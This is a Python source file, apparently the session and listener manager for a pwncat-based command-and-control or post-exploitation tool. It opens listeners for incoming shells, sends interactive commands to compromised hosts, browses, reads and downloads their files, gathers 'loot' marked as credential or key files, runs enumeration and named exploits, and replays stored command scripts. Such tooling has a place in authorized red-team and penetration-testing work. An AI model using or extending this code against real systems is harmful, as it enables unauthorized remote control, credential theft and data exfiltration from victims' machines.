import logging
import threading
import time

import pwncat
from files import (
    list_files as list_files_impl,
    read_file as read_file_impl,
    download_file as download_file_impl
)
from session import SessionIO

# --- Globals ---
listeners = {}
sessions = {}
scripts = {}  # To store user-defined scripts
next_listener_id = 0
sessions_lock = threading.Lock()
scripts_lock = threading.Lock()
log = logging.getLogger("pwncat")

# --------------------------------------------------------------------

def initialize_manager():
    p_log = logging.getLogger("pwncat")
    p_log.setLevel(logging.CRITICAL)

def create_listener(uri: str):
    global next_listener_id
    try:
        proto, _, host_port = uri.partition("://")
        host, _, port_str = host_port.rpartition(":")
        port = int(port_str)

        is_udp = proto.lower() == "udp"
        ssig = pwncat.InterruptHandler(keep_open=True, no_shutdown=False)
        enc = pwncat.StringEncoder()
        sock_opts = pwncat.DsIONetworkSock(pwncat.RECV_BUFSIZE, pwncat.LISTEN_BACKLOG,
                                           pwncat.TIMEOUT_RECV_SOCKET,
                                           pwncat.TIMEOUT_RECV_SOCKET_RETRY, False, False, False,
                                           None, None, is_udp, False, "", None, "")
        srv_opts = pwncat.DsIONetworkSrv(True, -1, 1.0, [])
        cli_opts = pwncat.DsIONetworkCli(-1, 1.0, [])
        net = pwncat.IONetwork(ssig, enc, host, [port], "server", srv_opts, cli_opts, sock_opts)

        session_io = SessionIO(ssig, sessions, sessions_lock)
        session_io.net_instance = net

        run = pwncat.Runner(ssig, False, pwncat.PSEStore(ssig, [net]))
        run.add_action("NET_TO_SESSION_IO",
                       pwncat.DsRunnerAction(pwncat.DsCallableProducer(net.producer),
                                             session_io.consumer, [net.interrupt], [], False, None))

        listener_id = next_listener_id
        thread = threading.Thread(target=run.run, daemon=True, name=f"Listener-{listener_id}")
        thread.start()

        listeners[listener_id] = {"id": listener_id, "uri": uri, "thread": thread, "ssig": ssig}
        next_listener_id += 1
        return {"id": listener_id, "uri": uri}
    except Exception as e:
        log.error(f"Create Listener Error: {e}")
        return {"error": str(e)}


def get_all_loot():
    """Aggregates loot from all active sessions."""
    all_loot = []
    with sessions_lock:
        for session in sessions.values():
            all_loot.extend(list(session.known_loot))
    # known_loot stores raw paths, convert to dict format
    return [{"type": "credential_file", "source": path,
             "content": "File identified as a potential credential or key."} for path in all_loot]

def get_listeners():
    return [{"id": l["id"], "uri": l["uri"]} for l in listeners.values()]

def remove_listener(listener_id: int):
    if listener_id in listeners:
        listeners[listener_id]["ssig"].raise_terminate()
        del listeners[listener_id]

def get_sessions():
    with sessions_lock:
        dead_sessions = [sid for sid, s in sessions.items() if s.proc.proc.poll() is not None]
        for sid in dead_sessions:
            log.info(f"Cleaning up dead session {sid}")
            del sessions[sid]
        return [{"id": s.id, "platform": s.platform} for s in sessions.values()]

def start_interactive_session(session_id: int, callback):
    with sessions_lock:
        if session_id in sessions:
            session = sessions[session_id]
            session.terminal_listener = callback
            log.info(f"Attaching terminal listener to session {session_id}")
            for item in list(session.terminal_buffer):
                callback.onOutput(pwncat.StringEncoder.decode(item))
        else:
            if callback: callback.onClose()

def send_to_terminal(session_id: int, command: str):
    with sessions_lock:
        if session_id in sessions:
            sessions[session_id].send_interactive_command(pwncat.StringEncoder.encode(command))

def list_files(session_id: int, path: str):
    return list_files_impl(session_id, path, sessions, sessions_lock)

def read_file(session_id: int, path: str):
    return read_file_impl(session_id, path, sessions, sessions_lock)


def download_file(session_id: int, remote_path: str, local_path: str):
    return download_file_impl(session_id, remote_path, local_path, sessions, sessions_lock)


def start_persistent_enumeration(session_id: int, listener):
    with sessions_lock:
        if session_id in sessions:
            log.info(f"Starting enumeration for session {session_id}")
            sessions[session_id].start_enumeration(listener)
        else:
            log.error(f"Attempted to start enumeration on non-existent session {session_id}")


def run_exploit(session_id: int, exploit_id: str):
    with sessions_lock:
        if session_id in sessions:
            session = sessions[session_id]
            output = session.execute_utility_command(exploit_id)
            if output is not None:
                return {"output": output}
            else:
                return {"error": f"Failed to run exploit: {exploit_id}"}
    return {"error": "Session not found"}


def save_script(name: str, content: str):
    with scripts_lock:
        scripts[name] = content
    return {"status": "success"}


def delete_script(name: str):
    with scripts_lock:
        if name in scripts:
            del scripts[name]
    return {"status": "success"}


def get_scripts():
    with scripts_lock:
        return [{"name": name} for name in scripts.keys()]


def get_script_content(name: str):
    with scripts_lock:
        content = scripts.get(name)
        if content is not None:
            return {"name": name, "content": content}
    return {"error": "Script not found"}


def run_script(session_id: int, script_name: str):
    with scripts_lock:
        if script_name not in scripts:
            return {"error": f"Script '{script_name}' not found."}
        content = scripts[script_name]

    with sessions_lock:
        if session_id not in sessions:
            return {"error": f"Session {session_id} not found."}
        session = sessions[session_id]

    for command in content.strip().splitlines():
        if command:
            session.send_interactive_command(pwncat.StringEncoder.encode(command + "\n"))
            time.sleep(0.2)

    return {"status": "success", "message": f"Script '{script_name}' executed."}
